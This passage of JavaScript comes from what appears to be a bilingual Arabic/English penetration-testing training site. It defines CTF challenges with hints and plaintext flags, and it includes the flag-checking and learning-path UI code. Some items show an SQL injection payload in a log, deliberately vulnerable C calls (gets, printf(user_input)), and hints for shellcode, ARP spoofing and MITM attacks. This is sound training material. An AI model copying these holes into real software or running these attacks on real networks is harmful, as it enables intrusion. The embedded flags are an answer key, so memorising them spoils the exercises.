      description: txt('احلل memory dump واستخرج password', 'Analyze memory dump and extract password'),
      hints: [
        txt('استخدم Volatility', 'Use Volatility'),
        txt('جرب: volatility -f mem.raw hashdump', 'Try: volatility -f mem.raw hashdump')
      ],
      flag: 'FLAG{MEMORY_PASSWORD_DUMPED}'
    },
    {
      id: 'for5',
      title: 'PCAP Analysis',
      difficulty: 'medium',
      points: 200,
      description: txt('احلل network traffic واستخرج الـ flag', 'Analyze network traffic and extract flag'),
      hints: [
        txt('استخدم Wireshark', 'Use Wireshark'),
        txt('ابحث في HTTP POST requests', 'Look in HTTP POST requests')
      ],
      flag: 'FLAG{PCAP_ANALYZED}'
    },
    {
      id: 'for6',
      title: 'Log Analysis',
      difficulty: 'medium',
      points: 150,
      description: txt('احلل logs واكتشف الـ attack', 'Analyze logs and discover the attack'),
      code: '192.168.1.100 - - [25/Nov/2024] "GET /admin.php?id=1\' OR 1=1--"',
      hints: [
        txt('ابحث عن SQL injection patterns', 'Look for SQL injection patterns'),
        txt('الـ IP المهاجم: 192.168.1.100', 'Attacker IP: 192.168.1.100')
      ],
      flag: 'FLAG{SQL_INJECTION_DETECTED}'
    },
    {
      id: 'for7',
      title: 'File Carving',
      difficulty: 'hard',
      points: 300,
      description: txt('استخرج ملف مخفي من disk image', 'Extract hidden file from disk image'),
      hints: [
        txt('استخدم foremost أو scalpel', 'Use foremost or scalpel'),
        txt('ابحث عن file signatures', 'Look for file signatures')
      ],
      flag: 'FLAG{FILE_CARVED_SUCCESS}'
    },
    {
      id: 'for8',
      title: 'Timeline Analysis',
      difficulty: 'hard',
      points: 400,
      description: txt('أنشئ timeline للأحداث', 'Create timeline of events'),
      hints: [
        txt('استخدم log2timeline', 'Use log2timeline'),
        txt('رتب الأحداث حسب الوقت', 'Sort events by time')
      ],
      flag: 'FLAG{TIMELINE_RECONSTRUCTED}'
    }
  ];
}

function getOSINTChallenges() {
  return [
    {
      id: 'osint1',
      title: 'Username Search',
      difficulty: 'easy',
      points: 50,
      description: txt('ابحث عن username "cybermaster2024" على منصات مختلفة', 'Search for username "cybermaster2024" on different platforms'),
      hints: [
        txt('استخدم namechk.com', 'Use namechk.com'),
        txt('جرب knowem.com', 'Try knowem.com')
      ],
      flag: 'FLAG{USERNAME_FOUND_ON_GITHUB}'
    },
    {
      id: 'osint2',
      title: 'Email Investigation',
      difficulty: 'easy',
      points: 75,
      description: txt('اكتشف معلومات عن البريد: hacker@example.com', 'Discover info about email: hacker@example.com'),
      hints: [
        txt('استخدم hunter.io', 'Use hunter.io'),
        txt('جرب have i been pwned', 'Try have i been pwned')
      ],
      flag: 'FLAG{EMAIL_BREACH_FOUND}'
    },
    {
      id: 'osint3',
      title: 'Geolocation',
      difficulty: 'medium',
      points: 150,
      description: txt('حدد الموقع من الصورة', 'Identify location from image'),
      hints: [
        txt('استخدم Google Lens', 'Use Google Lens'),
        txt('ابحث عن landmarks مميزة', 'Look for distinctive landmarks')
      ],
      flag: 'FLAG{LOCATION_IDENTIFIED}'
    },
    {
      id: 'osint4',
      title: 'Domain Research',
      difficulty: 'medium',
      points: 150,
      description: txt('اكتشف صاحب الدومين evil-corp.com', 'Discover owner of domain evil-corp.com'),
      hints: [
        txt('استخدم WHOIS lookup', 'Use WHOIS lookup'),
        txt('جرب whois.domaintools.com', 'Try whois.domaintools.com')
      ],
      flag: 'FLAG{DOMAIN_OWNER_FOUND}'
    },
    {
      id: 'osint5',
      title: 'Social Media Investigation',
      difficulty: 'medium',
      points: 200,
      description: txt('اجمع معلومات من حسابات social media', 'Gather info from social media accounts'),
      hints: [
        txt('ابحث في Twitter/X', 'Search on Twitter/X'),
        txt('استخدم LinkedIn', 'Use LinkedIn')
      ],
      flag: 'FLAG{SOCIAL_MEDIA_PROFILED}'
    },
    {
      id: 'osint6',
      title: 'Wayback Machine',
      difficulty: 'easy',
      points: 75,
      description: txt('اعثر على نسخة قديمة من موقع', 'Find old version of a website'),
      hints: [
        txt('استخدم web.archive.org', 'Use web.archive.org'),
        txt('ابحث عن snapshots قديمة', 'Look for old snapshots')
      ],
      flag: 'FLAG{WAYBACK_MACHINE_SUCCESS}'
    },
    {
      id: 'osint7',
      title: 'Image Reverse Search',
      difficulty: 'medium',
      points: 150,
      description: txt('اعثر على مصدر الصورة الأصلي', 'Find original source of image'),
      hints: [
        txt('استخدم Google Images', 'Use Google Images'),
        txt('جرب TinEye', 'Try TinEye')
      ],
      flag: 'FLAG{IMAGE_SOURCE_FOUND}'
    },
    {
      id: 'osint8',
      title: 'Public Records',
      difficulty: 'hard',
      points: 300,
      description: txt('اعثر على سجلات عامة للشخص', 'Find public records of person'),
      hints: [
        txt('ابحث في court records', 'Search court records'),
        txt('استخدم property records', 'Use property records')
      ],
      flag: 'FLAG{PUBLIC_RECORDS_DISCOVERED}'
    }
  ];
}

function getBinaryChallenges() {
  return [
    {
      id: 'bin1',
      title: 'Buffer Overflow Basic',
      difficulty: 'hard',
      points: 400,
      description: txt('استغل buffer overflow للتحكم في EIP', 'Exploit buffer overflow to control EIP'),
      code: 'char buffer[64];\ngets(buffer); // Vulnerable!',
      hints: [
        txt('احسب offset للـ EIP', 'Calculate offset to EIP'),
        txt('استخدم pattern_create', 'Use pattern_create')
      ],
      flag: 'FLAG{BUFFER_OVERFLOW_EXPLOITED}'
    },
    {
      id: 'bin2',
      title: 'Format String',
      difficulty: 'hard',
      points: 400,
      description: txt('استغل format string للقراءة من stack', 'Exploit format string to read from stack'),
      code: 'printf(user_input); // Vulnerable!',
      hints: [
        txt('استخدم %x للقراءة', 'Use %x to read'),
        txt('جرب %s لقراءة strings', 'Try %s to read strings')
      ],
      flag: 'FLAG{FORMAT_STRING_LEAKED}'
    },
    {
      id: 'bin3',
      title: 'Integer Overflow',
      difficulty: 'medium',
      points: 200,
      description: txt('استغل integer overflow', 'Exploit integer overflow'),
      code: 'unsigned char size = 255;\nsize = size + 1; // Overflow!',
      hints: [
        txt('255 + 1 = 0 في unsigned char', '255 + 1 = 0 in unsigned char'),
        txt('استغل الـ wraparound', 'Exploit the wraparound')
      ],
      flag: 'FLAG{INTEGER_OVERFLOW_EXPLOITED}'
    },
    {
      id: 'bin4',
      title: 'Use After Free',
      difficulty: 'hard',
      points: 500,
      description: txt('استغل use-after-free vulnerability', 'Exploit use-after-free vulnerability'),
      hints: [
        txt('استخدم الذاكرة بعد free()', 'Use memory after free()'),
        txt('تحكم في heap allocation', 'Control heap allocation')
      ],
      flag: 'FLAG{USE_AFTER_FREE_PWNED}'
    },
    {
      id: 'bin5',
      title: 'ROP Chain',
      difficulty: 'hard',
      points: 500,
      description: txt('أنشئ ROP chain لتجاوز NX', 'Build ROP chain to bypass NX'),
      hints: [
        txt('ابحث عن gadgets', 'Find gadgets'),
        txt('استخدم ROPgadget', 'Use ROPgadget')
      ],
      flag: 'FLAG{ROP_CHAIN_EXECUTED}'
    },
    {
      id: 'bin6',
      title: 'Shellcode Injection',
      difficulty: 'hard',
      points: 500,
      description: txt('احقن shellcode ونفذه', 'Inject and execute shellcode'),
      hints: [
        txt('استخدم msfvenom لتوليد shellcode', 'Use msfvenom to generate shellcode'),
        txt('تجنب null bytes', 'Avoid null bytes')
      ],
      flag: 'FLAG{SHELLCODE_EXECUTED}'
    }
  ];
}

function getNetworkChallenges() {
  return [
    {
      id: 'net1',
      title: 'Packet Sniffing',
      difficulty: 'easy',
      points: 75,
      description: txt('التقط packets واستخرج password', 'Capture packets and extract password'),
      hints: [
        txt('استخدم Wireshark', 'Use Wireshark'),
        txt('ابحث في HTTP traffic', 'Look in HTTP traffic')
      ],
      flag: 'FLAG{PACKET_SNIFFED_PASSWORD}'
    },
    {
      id: 'net2',
      title: 'ARP Spoofing',
      difficulty: 'medium',
      points: 200,
      description: txt('نفذ ARP spoofing attack', 'Execute ARP spoofing attack'),
      hints: [
        txt('استخدم arpspoof', 'Use arpspoof'),
        txt('تحكم في ARP table', 'Control ARP table')
      ],
      flag: 'FLAG{ARP_SPOOFED_SUCCESS}'
    },
    {
      id: 'net3',
      title: 'DNS Tunneling',
      difficulty: 'hard',
      points: 400,
      description: txt('اكتشف DNS tunneling', 'Detect DNS tunneling'),
      hints: [
        txt('ابحث عن DNS queries غريبة', 'Look for unusual DNS queries'),
        txt('حلل طول الـ subdomain', 'Analyze subdomain length')
      ],
      flag: 'FLAG{DNS_TUNNEL_DETECTED}'
    },
    {
      id: 'net4',
      title: 'SSL/TLS Analysis',
      difficulty: 'medium',
      points: 200,
      description: txt('حلل SSL/TLS handshake', 'Analyze SSL/TLS handshake'),
      hints: [
        txt('استخدم Wireshark', 'Use Wireshark'),
        txt('ابحث عن cipher suites', 'Look for cipher suites')
      ],
      flag: 'FLAG{SSL_HANDSHAKE_ANALYZED}'
    },
    {
      id: 'net5',
      title: 'Port Scanning Detection',
      difficulty: 'medium',
      points: 150,
      description: txt('اكتشف port scan في logs', 'Detect port scan in logs'),
      hints: [
        txt('ابحث عن SYN packets متتالية', 'Look for consecutive SYN packets'),
        txt('نفس الـ source IP', 'Same source IP')
      ],
      flag: 'FLAG{PORT_SCAN_DETECTED}'
    },
    {
      id: 'net6',
      title: 'Man-in-the-Middle',
      difficulty: 'hard',
      points: 500,
      description: txt('نفذ MITM attack', 'Execute MITM attack'),
      hints: [
        txt('استخدم ettercap', 'Use ettercap'),
        txt('تحكم في traffic flow', 'Control traffic flow')
      ],
      flag: 'FLAG{MITM_ATTACK_SUCCESS}'
    }
  ];
}

function getStegoChallenges() {
  return [
    {
      id: 'stego1',
      title: 'LSB Steganography',
      difficulty: 'medium',
      points: 150,
      description: txt('استخرج رسالة من LSB في صورة', 'Extract message from LSB in image'),
      hints: [
        txt('استخدم stegsolve', 'Use stegsolve'),
        txt('ابحث في least significant bits', 'Look in least significant bits')
      ],
      flag: 'FLAG{LSB_MESSAGE_EXTRACTED}'
    },
    {
      id: 'stego2',
      title: 'Image Metadata',
      difficulty: 'easy',
      points: 75,
      description: txt('اعثر على flag في metadata', 'Find flag in metadata'),
      hints: [
        txt('استخدم exiftool', 'Use exiftool'),
        txt('ابحث في comment field', 'Look in comment field')
      ],
      flag: 'FLAG{METADATA_HIDDEN_FLAG}'
    },
    {
      id: 'stego3',
      title: 'Audio Steganography',
      difficulty: 'hard',
      points: 300,
      description: txt('استخرج رسالة من ملف صوتي', 'Extract message from audio file'),
      hints: [
        txt('استخدم Audacity', 'Use Audacity'),
        txt('حلل spectrogram', 'Analyze spectrogram')
      ],
      flag: 'FLAG{AUDIO_STEGO_DECODED}'
    },
    {
      id: 'stego4',
      title: 'QR Code Hidden',
      difficulty: 'medium',
      points: 150,
      description: txt('اعثر على QR code مخفي', 'Find hidden QR code'),
      hints: [
        txt('غير contrast/brightness', 'Change contrast/brightness'),
        txt('استخدم QR reader', 'Use QR reader')
      ],
      flag: 'FLAG{QR_CODE_SCANNED}'
    },
    {
      id: 'stego5',
      title: 'Whitespace Steganography',
      difficulty: 'medium',
      points: 200,
      description: txt('استخرج رسالة من whitespace', 'Extract message from whitespace'),
      hints: [
        txt('ابحث عن spaces و tabs', 'Look for spaces and tabs'),
        txt('استخدم stegsnow', 'Use stegsnow')
      ],
      flag: 'FLAG{WHITESPACE_DECODED}'
    },
    {
      id: 'stego6',
      title: 'ZIP File Comment',
      difficulty: 'easy',
      points: 50,
      description: txt('اعثر على flag في ZIP comment', 'Find flag in ZIP comment'),
      hints: [
        txt('استخدم: unzip -z file.zip', 'Use: unzip -z file.zip'),
        txt('ابحث في file comments', 'Look in file comments')
      ],
      flag: 'FLAG{ZIP_COMMENT_FOUND}'
    }
  ];
}

// CTF Logic (Global helper)
window.ctfData = {
  solved: JSON.parse(localStorage.getItem('ctfSolved') || '{}'),
  hints: JSON.parse(localStorage.getItem('ctfHints') || '{}')
};

window.checkFlag = function (category, challengeId) {
  const input = document.getElementById(`flag - ${category} -${challengeId} `).value.trim();
  const resultDiv = document.getElementById(`result - ${category} -${challengeId} `);

  // Get all challenges
  const allChallenges = {
    web: getWebChallenges(),
    crypto: getCryptoChallenges(),
    reverse: getReverseChallenges(),
    forensics: getForensicsChallenges(),
    osint: getOSINTChallenges(),
    binary: getBinaryChallenges(),
    network: getNetworkChallenges(),
    stego: getStegoChallenges()
  };

  const challenge = allChallenges[category].find(c => c.id === challengeId);

  if (!challenge) {
    resultDiv.innerHTML = '<div class="alert alert-danger">Challenge not found!</div>';
    return;
  }

  if (input === challenge.flag) {
    // Check if already solved
    const key = `${category} -${challengeId} `;
    if (window.ctfData.solved[key]) {
      resultDiv.innerHTML = `<div class="alert alert-info" > ${txt('تم حلها مسبقاً!', 'Already solved!')}</div> `;
      return;
    }

    // Mark as solved
    window.ctfData.solved[key] = true;
    localStorage.setItem('ctfSolved', JSON.stringify(window.ctfData.solved));

    // Award XP
    if (typeof xpSystem !== 'undefined') {
      xpSystem.addXp(challenge.points);
    }

    // Update UI
    resultDiv.innerHTML = `<div class="alert alert-success" >
  <i class="fa-solid fa-check-circle"></i> ${txt('صحيح!', 'Correct!')} +${challenge.points} XP
    </div> `;

    document.getElementById(`flag - ${category} -${challengeId} `).disabled = true;
    document.getElementById(`flag - ${category} -${challengeId} `).classList.add('is-valid');

    // Update progress
    updateCTFProgress();
  } else {
    resultDiv.innerHTML = `<div class="alert alert-danger" >
  <i class="fa-solid fa-times-circle"></i> ${txt('خطأ! حاول مرة أخرى', 'Incorrect! Try again')}
    </div> `;
  }
};

window.updateCTFProgress = function () {
  const solved = window.ctfData.solved;
  const categories = {
    web: 12,
    crypto: 10,
    reverse: 8,
    forensics: 8,
    osint: 8,
    binary: 6,
    network: 6,
    stego: 6
  };

  let totalSolved = 0;
  let easyCount = 0, mediumCount = 0, hardCount = 0;

  // Update category badges
  Object.keys(categories).forEach(cat => {
    const catSolved = Object.keys(solved).filter(k => k.startsWith(cat + '-')).length;
    totalSolved += catSolved;

    const badge = document.getElementById(`${cat} -badge`);
    if (badge) {
      badge.textContent = `${catSolved}/${categories[cat]}`;
      if (catSolved === categories[cat]) {
        badge.classList.remove('bg-primary');
        badge.classList.add('bg-success');
      }
    }
  });

  // Count by difficulty
  const allChallenges = {
    web: getWebChallenges(),
    crypto: getCryptoChallenges(),
    reverse: getReverseChallenges(),
    forensics: getForensicsChallenges(),
    osint: getOSINTChallenges(),
    binary: getBinaryChallenges(),
    network: getNetworkChallenges(),
    stego: getStegoChallenges()
  };

  Object.keys(solved).forEach(key => {
    const [cat, id] = key.split('-');
    const challenge = allChallenges[cat]?.find(c => c.id === id);
    if (challenge) {
      if (challenge.difficulty === 'easy') easyCount++;
      else if (challenge.difficulty === 'medium') mediumCount++;
      else if (challenge.difficulty === 'hard') hardCount++;
    }
  });

  // Update overall progress
  const progressBar = document.getElementById('ctf-overall-progress');
  const progressText = document.getElementById('ctf-progress-text');
  if (progressBar && progressText) {
    const percentage = Math.round((totalSolved / 64) * 100);
    progressBar.style.width = `${percentage}%`;
    progressText.textContent = `${totalSolved}/64 (${percentage}%)`;
  }

  // Update difficulty counts
  const easyEl = document.getElementById('easy-count');
  const mediumEl = document.getElementById('medium-count');
  const hardEl = document.getElementById('hard-count');

  if (easyEl) easyEl.textContent = easyCount;
  if (mediumEl) mediumEl.textContent = mediumCount;
  if (hardEl) hardEl.textContent = hardCount;

  // Mark solved challenges
  Object.keys(solved).forEach(key => {
    const [cat, id] = key.split('-');
    const input = document.getElementById(`flag-${cat}-${id}`);
    if (input && !input.disabled) {
      input.disabled = true;
      input.classList.add('is-valid');
      input.value = '✓ Solved';
    }
  });
}

// Open challenge in full-page view
window.openChallenge = function (category, challengeId) {
  // Get all challenges
  const allChallenges = {
    web: getWebChallenges(),
    crypto: getCryptoChallenges(),
    reverse: getReverseChallenges(),
    forensics: getForensicsChallenges(),
    osint: getOSINTChallenges(),
    binary: getBinaryChallenges(),
    network: getNetworkChallenges(),
    stego: getStegoChallenges()
  };

  const challenge = allChallenges[category].find(c => c.id === challengeId);

  if (!challenge) {
    alert('Challenge not found!');
    return;
  }

  const difficultyColors = {
    easy: 'success',
    medium: 'warning',
    hard: 'danger'
  };

  const difficultyIcons = {
    easy: 'star',
    medium: 'fire',
    hard: 'skull'
  };

  const categoryNames = {
    web: txt('اختراق الويب', 'Web Exploitation'),
    crypto: txt('التشفير', 'Cryptography'),
    reverse: txt('الهندسة العكسية', 'Reverse Engineering'),
    forensics: txt('التحليل الجنائي', 'Forensics'),
    osint: txt('استخبارات مفتوحة', 'OSINT'),
    binary: txt('استغلال ثنائي', 'Binary Exploitation'),
    network: txt('أمن الشبكات', 'Network Security'),
    stego: txt('إخفاء المعلومات', 'Steganography')
  };

  const isSolved = window.ctfData && window.ctfData.solved && window.ctfData.solved[`${category}-${challengeId}`];

  const challengeHTML = `
    <div id="challenge-fullpage" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-color); z-index: 9999; overflow-y: auto;">
      <div class="container py-4">
        <!-- Header -->
        <div class="d-flex justify-content-between align-items-center mb-4">
          <button class="btn btn-outline-secondary" onclick="closeChallenge()">
            <i class="fa-solid fa-arrow-left"></i> ${txt('رجوع', 'Back')}
          </button>
          <h3 class="mb-0">${categoryNames[category]}</h3>
          <div></div>
        </div>
        
        <!-- Challenge Card -->
        <div class="card shadow-lg">
          <div class="card-header bg-${difficultyColors[challenge.difficulty]} text-white py-3">
            <div class="d-flex justify-content-between align-items-center">
              <h4 class="mb-0">
                <i class="fa-solid fa-${difficultyIcons[challenge.difficulty]}"></i>
                ${challenge.title}
              </h4>
              <span class="badge bg-dark fs-6">${challenge.points} XP</span>
            </div>
          </div>
          
          <div class="card-body p-4">
            ${isSolved ? `
              <div class="alert alert-success">
                <h5><i class="fa-solid fa-trophy"></i> ${txt('تهانينا! لقد حللت هذا التحدي', 'Congratulations! You solved this challenge')}</h5>
                <p class="mb-0">${txt('لقد حصلت على', 'You earned')} ${challenge.points} XP</p>
              </div>
            ` : ''}
            
            <!-- Description -->
            <div class="mb-4">
              <h5><i class="fa-solid fa-info-circle"></i> ${txt('الوصف', 'Description')}</h5>
              <p class="lead">${challenge.description}</p>
            </div>
            
            <!-- Code (if exists) -->
            ${challenge.code ? `
              <div class="mb-4">
                <h5><i class="fa-solid fa-code"></i> ${txt('الكود', 'Code')}</h5>
                <pre class="bg-dark text-light p-3 rounded"><code>${challenge.code}</code></pre>
              </div>
            ` : ''}
            
            <!-- Hints -->
            <div class="mb-4">
              <h5><i class="fa-solid fa-lightbulb"></i> ${txt('التلميحات', 'Hints')}</h5>
              <div class="accordion" id="hints-fullpage-${category}-${challengeId}">
                ${challenge.hints.map((hint, idx) => `
                  <div class="accordion-item">
                    <h2 class="accordion-header">
                      <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#hint-full-${category}-${challengeId}-${idx}">
                        <i class="fa-solid fa-lightbulb me-2"></i>
                        ${txt('تلميح', 'Hint')} ${idx + 1}
                        <span class="badge bg-warning text-dark ms-2">-${Math.floor(challenge.points * 0.1)} XP</span>
                      </button>
                    </h2>
                    <div id="hint-full-${category}-${challengeId}-${idx}" class="accordion-collapse collapse">
                      <div class="accordion-body">
                        ${hint}
                      </div>
                    </div>
                  </div>
                `).join('')}
              </div>
            </div>
            
            <!-- Flag Submission -->
            <div class="mb-4">
              <h5><i class="fa-solid fa-flag-checkered"></i> ${txt('أدخل الـ Flag', 'Submit Flag')}</h5>
              <div class="input-group input-group-lg">
                <input type="text" class="form-control" id="flag-full-${category}-${challengeId}" placeholder="FLAG{...}" autocomplete="off" ${isSolved ? 'disabled' : ''}>
                <button class="btn btn-success btn-lg" onclick="checkFlagFullpage('${category}', '${challengeId}')" ${isSolved ? 'disabled' : ''}>
                  <i class="fa-solid fa-check"></i> ${txt('تحقق', 'Submit')}
                </button>
              </div>
              <div id="result-full-${category}-${challengeId}" class="mt-3"></div>
            </div>
            
            <!-- Tips -->
            <div class="alert alert-info">
              <h6><i class="fa-solid fa-circle-info"></i> ${txt('نصائح', 'Tips')}</h6>
              <ul class="mb-0">
                <li>${txt('الـ Flag يكون بصيغة FLAG{...}', 'Flag format is FLAG{...}')}</li>
                <li>${txt('استخدم التلميحات إذا احتجت مساعدة', 'Use hints if you need help')}</li>
                <li>${txt('كل تلميح يخصم 10% من نقاط التحدي', 'Each hint costs 10% of challenge points')}</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;

  // Add to page
  document.body.insertAdjacentHTML('beforeend', challengeHTML);

  // Scroll to top
  document.getElementById('challenge-fullpage').scrollTop = 0;
};

// Close challenge fullpage view
window.closeChallenge = function () {
  const fullpage = document.getElementById('challenge-fullpage');
  if (fullpage) {
    fullpage.remove();
  }
};

// Check flag in fullpage view
window.checkFlagFullpage = function (category, challengeId) {
  const input = document.getElementById(`flag-full-${category}-${challengeId}`).value.trim();
  const resultDiv = document.getElementById(`result-full-${category}-${challengeId}`);

  // Get all challenges
  const allChallenges = {
    web: getWebChallenges(),
    crypto: getCryptoChallenges(),
    reverse: getReverseChallenges(),
    forensics: getForensicsChallenges(),
    osint: getOSINTChallenges(),
    binary: getBinaryChallenges(),
    network: getNetworkChallenges(),
    stego: getStegoChallenges()
  };

  const challenge = allChallenges[category].find(c => c.id === challengeId);

  if (!challenge) {
    resultDiv.innerHTML = '<div class="alert alert-danger">Challenge not found!</div>';
    return;
  }

  if (input === challenge.flag) {
    // Check if already solved
    const key = `${category}-${challengeId}`;
    if (window.ctfData.solved[key]) {
      resultDiv.innerHTML = `<div class="alert alert-info">
        <i class="fa-solid fa-info-circle"></i> ${txt('تم حلها مسبقاً!', 'Already solved!')}
      </div>`;
      return;
    }

    // Mark as solved
    window.ctfData.solved[key] = true;
    localStorage.setItem('ctfSolved', JSON.stringify(window.ctfData.solved));

    // Award XP
    if (typeof xpSystem !== 'undefined') {
      xpSystem.addXp(challenge.points);
    }

    // Update UI
    resultDiv.innerHTML = `<div class="alert alert-success">
      <h5><i class="fa-solid fa-trophy"></i> ${txt('صحيح! تهانينا!', 'Correct! Congratulations!')}</h5>
      <p class="mb-0">${txt('لقد حصلت على', 'You earned')} +${challenge.points} XP</p>
    </div>`;

    document.getElementById(`flag-full-${category}-${challengeId}`).disabled = true;
    document.getElementById(`flag-full-${category}-${challengeId}`).classList.add('is-valid');

    // Update progress (will reflect when returning to main page)
    updateCTFProgress();

    // Show success animation
    setTimeout(() => {
      resultDiv.innerHTML += `
        <div class="text-center mt-3">
          <button class="btn btn-primary btn-lg" onclick="closeChallenge()">
            <i class="fa-solid fa-arrow-left"></i> ${txt('العودة للتحديات', 'Back to Challenges')}
          </button>
        </div>
      `;
    }, 1000);
  } else {
    resultDiv.innerHTML = `<div class="alert alert-danger">
      <i class="fa-solid fa-times-circle"></i> ${txt('خطأ! حاول مرة أخرى', 'Incorrect! Try again')}
    </div>`;
  }
}


// ========== Learning Paths Helper Functions (Global Scope) ==========
window.showPathDetails = function (pathId) {
  const path = learningPaths[pathId];
  if (!path) return;

  // Hide the path selection cards
  const pathCards = document.querySelector('.row.g-4.mb-5');
  if (pathCards) pathCards.style.display = 'none';

  const container = document.getElementById('path-details-container');
  let html = `
    <div class="card border-${path.color} mb-4">
      <div class="card-header bg-${path.color} ${pathId === 'intermediate' ? 'text-dark' : 'text-white'}">
        <h3><i class="fa-solid ${path.icon}"></i> ${path.title[currentLang] || path.title.ar}</h3>
      </div>
      <div class="card-body">
  `;

  // Render modules
  path.modules.forEach((module, index) => {
    html += `
      <div class="card mb-3">
        <div class="card-header bg-light">
          <h5><i class="fa-solid fa-book"></i> ${txt('الوحدة', 'Module')} ${module.id}: ${module.title[currentLang] || module.title.ar}</h5>
          <small class="text-muted"><i class="fa-solid fa-clock"></i> ${module.duration}</small>
        </div>
        <div class="card-body">
          <p>${module.description[currentLang] || module.description.ar}</p>
          
          ${module.lessons ? `
            <h6 class="mt-3">${txt('الدروس:', 'Lessons:')}</h6>
            <div class="list-group mb-3">
              ${module.lessons.map(lesson => `
                <a href="#" class="list-group-item list-group-item-action" onclick="showLesson('${pathId}', ${module.id}, ${lesson.id}); return false;">
                  <i class="fa-solid fa-play-circle"></i> ${lesson.title[currentLang] || lesson.title.ar}
                </a>
              `).join('')}
            </div>
          ` : ''}
          
          ${module.topics ? `
            <h6 class="mt-3">${txt('المواضيع:', 'Topics:')}</h6>
            <ul class="small">
              ${module.topics.map(topic => `<li>${topic[currentLang] || topic.ar}</li>`).join('')}
            </ul>
          ` : ''}
          
          ${module.externalResources ? `
            <h6 class="mt-3"><i class="fa-solid fa-link"></i> ${txt('مصادر خارجية:', 'External Resources:')}</h6>
            <div class="list-group">
              ${module.externalResources.map(resource => `
                <a href="${resource.url}" target="_blank" class="list-group-item list-group-item-action">
                  <i class="fa-solid ${resource.icon || 'fa-link'}"></i> ${resource.title[currentLang] || resource.title.ar}
                  ${resource.description ? `<br><small class="text-muted">${resource.description[currentLang] || resource.description.ar}</small>` : ''}
                </a>
              `).join('')}
            </div>
          ` : ''}
        </div>
      </div>
    `;
  });

  html += `
      </div>
    </div>
  `;

  container.innerHTML = html;
  container.scrollIntoView({ behavior: 'smooth' });
};

window.showLesson = function (pathId, moduleId, lessonId) {
  const path = learningPaths[pathId];
  const module = path.modules.find(m => m.id === moduleId);
  const lesson = module.lessons.find(l => l.id === lessonId);

  if (!lesson) return;

  const container = document.getElementById('path-details-container');
  const content = lesson.content[currentLang] || lesson.content.ar;

  container.innerHTML = `
    <div class="card mb-4">
      <div class="card-header bg-primary text-white">
        <h4>${lesson.title[currentLang] || lesson.title.ar}</h4>
        <button class="btn btn-sm btn-light float-end" onclick="showPathDetails('${pathId}')">
          <i class="fa-solid fa-arrow-left"></i> ${txt('رجوع', 'Back')}
        </button>
      </div>
      <div class="card-body">
        <div class="lesson-content">
          ${content.replace(/\n/g, '<br>')}
        </div>
        
        ${lesson.labFile ? `
          <div class="alert alert-info mt-4">
            <h5><i class="fa-solid fa-flask"></i> ${txt('تطبيق عملي', 'Practical Lab')}</h5>
            <p>${txt('هذا الدرس يحتوي على مختبر عملي تفاعلي. جربه الآن!', 'This lesson includes an interactive practical lab. Try it now!')}</p>
            <button class="btn btn-success w-100" onclick="openEducationContent('${lesson.labFile.replace('-education.html', '')}')">
              <i class="fa-solid fa-rocket"></i> ${txt('ابدأ المختبر العملي', 'Start Interactive Lab')}
            </button>
          </div>
        ` : ''}
        
        ${module.quiz ? `
          <div class="mt-4">
            <h5>${txt('اختبر فهمك:', 'Test Your Understanding:')}</h5>
            <div id="quiz-container">
              ${module.quiz.map((q, i) => `
                <div class="card mb-3">
                  <div class="card-body">
                    <p><strong>${i + 1}. ${q.question[currentLang] || q.question.ar}</strong></p>
                    <div class="btn-group-vertical w-100" role="group">
                      ${q.options.map((opt, optIndex) => `
                        <button class="btn btn-outline-primary text-start" onclick="checkQuizAnswer(${i}, ${optIndex}, ${q.correct})">
                          ${opt[currentLang] || opt.ar}
                        </button>
                      `).join('')}
                    </div>
                    <div id="quiz-feedback-${i}" class="mt-2"></div>
                  </div>
                </div>
              `).join('')}
            </div>
          </div>
        ` : ''}
      </div>
    </div>
  `;

  container.scrollIntoView({ behavior: 'smooth' });
};

window.resetPathView = function () {
  // Show the path selection cards again
  const pathCards = document.querySelector('.row.g-4.mb-5');
  if (pathCards) pathCards.style.display = 'flex';

  // Clear the details container
  document.getElementById('path-details-container').innerHTML = '';

  // Scroll to top
  window.scrollTo({ top: 0, behavior: 'smooth' });
};

window.checkQuizAnswer = function (questionIndex, selectedIndex, correctIndex) {
  const feedback = document.getElementById(`quiz-feedback-${questionIndex}`);
  if (selectedIndex === correctIndex) {
    feedback.innerHTML = '<div class="alert alert-success"><i class="fa-solid fa-check"></i> ' + txt('إجابة صحيحة!', 'Correct!') + '</div>';
    if (typeof addXP !== 'undefined') addXP(10);
  } else {
    feedback.innerHTML = '<div class="alert alert-danger"><i class="fa-solid fa-times"></i> ' + txt('إجابة خاطئة، حاول مرة أخرى', 'Incorrect, try again') + '</div>';
  }
};

// ========== Learning Paths Page ==========
function pageLearningPaths() {
  // Check if learningPaths is loaded
  if (typeof learningPaths === 'undefined') {
    return `<div class="alert alert-danger">Error: Learning paths data not loaded. Please refresh the page.</div>`;
  }

  const { beginner, intermediate, advanced } = learningPaths;

  return `
    <div class="container mt-4">
      <div class="hero-section text-center mb-5">
        <h1><i class="fa-solid fa-route"></i> ${txt('المسارات التعليمية', 'Learning Paths')}</h1>
        <p class="lead">${txt('تعلم اختبار الاختراق خطوة بخطوة من الصفر إلى الاحتراف', 'Learn penetration testing step-by-step from zero to professional')}</p>
      </div>
      
      <!-- Path Selection Cards -->
      <div class="row g-4 mb-5">
        <!-- Beginner Path -->
        <div class="col-md-4">
          <div class="card border-${beginner.color} h-100 shadow-sm">
            <div class="card-header bg-${beginner.color} text-white text-center">
              <i class="fa-solid ${beginner.icon} fa-2x mb-2"></i>
              <h4>${beginner.title[currentLang] || beginner.title.ar}</h4>
              <small>${beginner.duration}</small>
            </div>
            <div class="card-body">
              <p>${beginner.description[currentLang] || beginner.description.ar}</p>
              <ul class="list-unstyled">
                <li><i class="fa-solid fa-check text-success"></i> ${beginner.modules.length} ${txt('وحدات', 'modules')}</li>
                <li><i class="fa-solid fa-check text-success"></i> ${txt('كويزات وتمارين', 'Quizzes & exercises')}</li>
                <li><i class="fa-solid fa-check text-success"></i> ${txt('مشاريع عملية', 'Practical projects')}</li>
              </ul>
              <button class="btn btn-${beginner.color} w-100" onclick="showPathDetails('beginner')">
                ${txt('ابدأ الآن', 'Start Now')}
              </button>
            </div>
          </div>
        </div>
        
        <!-- Intermediate Path -->
        <div class="col-md-4">
          <div class="card border-${intermediate.color} h-100 shadow-sm">
            <div class="card-header bg-${intermediate.color} text-dark text-center">
